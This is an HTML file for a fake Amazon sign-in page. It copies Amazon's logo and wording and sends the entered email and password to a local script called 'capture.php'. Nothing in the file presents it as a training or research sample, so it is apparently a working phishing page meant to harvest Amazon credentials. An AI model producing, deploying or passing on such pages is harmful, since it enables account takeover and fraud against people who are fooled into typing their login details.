<!-- File: index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign In</title>
    <link rel="stylesheet" href="./styles.css">
</head>
<body>
    <div class="signin-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" class="logo">
        <h1>Sign in</h1>
        <form action="./capture.php" method="POST">
            <label for="email">Email or mobile phone number</label>
            <input type="text" id="email" name="email" required>
            <input type="password" id="password" name="password" required>
            <button type="submit">Continue</button>
        </form>
        <p class="small-text">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
        <a href="#" class="help-link">Need help?</a>
        <p class="new-account">New to Amazon?</p>
        <a href="#" class="create-account">Create your Amazon account</a>
    </div>
</body>
</html>